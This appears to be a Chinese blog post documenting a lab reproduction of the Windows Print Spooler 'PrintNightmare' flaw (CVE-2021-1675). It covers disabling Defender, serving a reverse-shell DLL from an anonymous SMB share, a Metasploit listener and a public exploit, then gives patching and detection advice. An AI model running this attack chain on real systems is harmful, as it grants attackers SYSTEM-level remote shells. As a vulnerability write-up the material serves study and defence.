> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/wxh0000mm/article/details/120156175)

漏洞详情
====

Microsoft Windows Print Spooler 服务未能限制对 RpcAddPrinterDriverEx() 函数的访问，该函数可能允许远程身份验证的攻击者以系统权限在易受攻击的系统上执行任意代码。该 RpcAddPrinterDriverEx() 函数用于在系统上安装打印机驱动程序。此函数的参数之一是 DRIVER_CONTAINER 对象，它包含有关添加的打印机将使用哪个驱动程序的信息。另一个参数，dwFileCopyFlags 指定如何复制替换打印机驱动程序文件。攻击者可以利用任何经过身份验证的用户都可以调用 RpcAddPrinterDriverEx() 并指定位于远程服务器上的驱动程序文件这一事实。这会导致 Print Spooler 服务 spoolsv.exe 以 SYSTEM 权限执行任意 DLL 文件中的代码。

影响版本：

Windows Server 2012 R2 (Server Core installation)

Windows Server 2012 R2

Windows Server 2012 (Server Core installation)

Windows Server 2012

Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)

Windows Server 2008 R2 for x64-based Systems Service Pack 1

Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)

Windows Server 2008 for x64-based Systems Service Pack 2

Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)

Windows Server 2008 for 32-bit Systems Service Pack 2

Windows RT 8.1

Windows 8.1 for x64-based systems

Windows 8.1 for 32-bit systems

Windows 7 for x64-based Systems Service Pack 1

Windows 7 for 32-bit Systems Service Pack 1

Windows Server 2016 (Server Core installation)

Windows Server 2016

Windows 10 Version 1607 for x64-based Systems

Windows 10 Version 1607 for 32-bit Systems

Windows 10 for x64-based Systems

Windows 10 for 32-bit Systems

Windows Server, version 20H2 (Server Core Installation)

Windows 10 Version 20H2 for ARM64-based Systems

Windows 10 Version 20H2 for 32-bit Systems

Windows 10 Version 20H2 for x64-based Systems

Windows Server, version 2004 (Server Core installation)

Windows 10 Version 2004 for x64-based Systems

Windows 10 Version 2004 for ARM64-based Systems

Windows 10 Version 2004 for 32-bit Systems

Windows 10 Version 21H1 for 32-bit Systems

Windows 10 Version 21H1 for ARM64-based Systems

Windows 10 Version 21H1 for x64-based Systems

Windows 10 Version 1909 for ARM64-based Systems

Windows 10 Version 1909 for x64-based Systems

Windows 10 Version 1909 for 32-bit Systems

Windows Server 2019 (Server Core installation)

Windows Server 2019

Windows 10 Version 1809 for ARM64-based Systems

Windows 10 Version 1809 for x64-based Systems

Windows 10 Version 1809 for 32-bit Systems

漏洞复现
====

环境：windows 2019 server 虚拟机 (192.168.175.133) 和 kali 虚拟机 (192.168.175.132)，虚拟机都是 NAT 模式。

windows 2019 server 中的配置：
-------------------------

windows 2019 server 参考 [https://blog.csdn.net/wxh0000mm/article/details/120151737](https://blog.csdn.net/wxh0000mm/article/details/120151737) 另一篇创建域

创建域用户如下：

![](https://img-blog.csdnimg.cn/20210907133744145.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

![](https://img-blog.csdnimg.cn/202109071339564.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

![](https://img-blog.csdnimg.cn/20210907134048457.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_17,color_FFFFFF,t_70,g_se,x_16)

 ![](https://img-blog.csdnimg.cn/20210907134124387.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 ![](https://img-blog.csdnimg.cn/20210907134142402.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_12,color_FFFFFF,t_70,g_se,x_16)

![](https://img-blog.csdnimg.cn/20210907135456910.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

在服务中启动 Print Spooler 服务

![](https://img-blog.csdnimg.cn/20210907134311436.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

![](https://img-blog.csdnimg.cn/20210907134506522.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 Print Spooler 服务启动之后![](https://img-blog.csdnimg.cn/20210907134518948.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 关闭 windows Defender 病毒和威胁防护实时保护，这是因为使用的是反弹 shell，反弹 shell 很早就在 windows Defender 中被杀掉了。

 ![](https://img-blog.csdnimg.cn/20210907134730473.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 ![](https://img-blog.csdnimg.cn/20210907134751308.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_15,color_FFFFFF,t_70,g_se,x_16)

 ![](https://img-blog.csdnimg.cn/20210907134812246.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_15,color_FFFFFF,t_70,g_se,x_16)

Kali 中的配置：
----------

先把作者的 impacket 包下载下来运行，链接为

```
https://github.com/cube0x0/impacket

```

 运行

```
cd impacket
python3 ./setup.py install
```

开启匿名访问 SMB

![](https://img-blog.csdnimg.cn/20210907135913147.png)

 在 smb.conf 末尾添加

![](https://img-blog.csdnimg.cn/20210907135954895.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_10,color_FFFFFF,t_70,g_se,x_16)

 这里我使用原作者的也不行，后面参考了网络上其它人的配置才可以成功访问，在结尾添加了 force user = nobody，网上有人说也可以添加 force user = smbuser，可以试试

配置完后，开启 SMBD，我配置修改之后都重新开启一遍。

![](https://img-blog.csdnimg.cn/20210907140252659.png)

因为 spoolsv.exe 是 x64 的，所以生成的 dll 也得是 x64，生成 dll 我使用的是 windows/x64/shell_reverse_tcp 跟网上一些人的不一样

![](https://img-blog.csdnimg.cn/20210907140515551.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 LHOST 是 Kali 的 IP  ，LPORT 设置为 443 ，生成的反弹 shell 放在了 TMP 文件夹下，这个文件夹也是 SMBD 设置的匿名共享文件夹

![](https://img-blog.csdnimg.cn/20210907140740681.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 开启监听

```
msfconsole
use exploit/multi/handler 
set payload windows/x64/shell_reverse_tcp
set lhost 192.168.175.132  (KALI的IP)
set lport 443              (监听的端口，与生产的DLL一样的配置)
run
```

 ![](https://img-blog.csdnimg.cn/20210907140950344.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 ![](https://img-blog.csdnimg.cn/20210907141046811.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_17,color_FFFFFF,t_70,g_se,x_16)

 exp 链接

```
https://github.com/cube0x0/CVE-2021-1675


```

 ![](https://img-blog.csdnimg.cn/20210907141311758.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 按照示例运行 EXP

![](https://img-blog.csdnimg.cn/20210907141605724.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

![](https://img-blog.csdnimg.cn/20210907141625550.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

 下面总提示错误，一直没有去管，但是反弹 shell 好使

![](https://img-blog.csdnimg.cn/20210907141752314.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)

简单测试一下：

 ![](https://img-blog.csdnimg.cn/20210907141913876.png)

 ![](https://img-blog.csdnimg.cn/20210907141938115.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_19,color_FFFFFF,t_70,g_se,x_16)

将在 Kali 中生成的 rever.dll 拷贝到 Windows 2019 server 的 C 盘中，在 Kali 中建立监听反弹 shell，直接运行 Windows 中的 rever.dll，Kali 的反弹监听也可以 

![](https://img-blog.csdnimg.cn/2021090714224237.png)

解决方案：
=====

更新官方补丁
------

目前微软官方已针对支持的系统版本发布了修复该漏洞的安全补丁，强烈建议受影响用户尽快安装补丁进行防护，官方下载链接：

```
https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675

```

关闭 Print Spooler 服务
-------------------

  
若相关用户暂时无法进行补丁更新，可通过禁用 Print Spooler 服务来进行缓解：  
1、在服务应用（services.msc）中找到 Print Spooler 服务。  
![](https://img-blog.csdnimg.cn/20210907143535291.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_20,color_FFFFFF,t_70,g_se,x_16)  
2、停止运行服务，同时将 “启动类型” 修改为“禁用”。  
![](https://img-blog.csdnimg.cn/20210907143623266.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5a2Q5puw5bCP546W,size_16,color_FFFFFF,t_70,g_se,x_16)  
如果禁用 Print Spooler 服务适合您的企业，请使用以下 PowerShell 命令：

```
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

关闭打印机服务
-------

```
Stop-Service Spooler
 
REG ADD  "HKLMSYSTEMCurrentControlSetServicesSpooler"  /v "Start " /t 
REG_DWORD /d "4" /f
```

或卸载打印服务
-------

```
Uninstall-WindowsFeature Print-Services

```

检测方法
----

```
EventID = '11' and Image like 'spoolsv.exe' and TargetFilename like 'C:WindowsSystem32spooldriversx643'
 
EventID      316Message    INFO 316 NT AUTHORITYSYSTEM 已添加或更新 Windows x64
```

 总结：
====

我没有碰到网上说的利用一次，Print sploor 服务会自动关闭，可能跟我运行 EXP 时下面有一些错误有关

参考文章和项目
-------

*   [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
    
*   [https://github.com/afwu/PrintNightmare](https://github.com/afwu/PrintNightmare)
    
*   [https://blog.csdn.net/ShelleyLiu0415/article/details/47836855](https://blog.csdn.net/ShelleyLiu0415/article/details/47836855)
    
*   [https://blog.csdn.net/weixin_42345596/article/details/118544065](https://blog.csdn.net/weixin_42345596/article/details/118544065)
    
*   [http://noahblog.360.cn/cve-2021-1675/](http://noahblog.360.cn/cve-2021-1675/)
    
*   [https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ](https://mp.weixin.qq.com/s/iNOb6cBAfMwCm2AjqbdEvQ)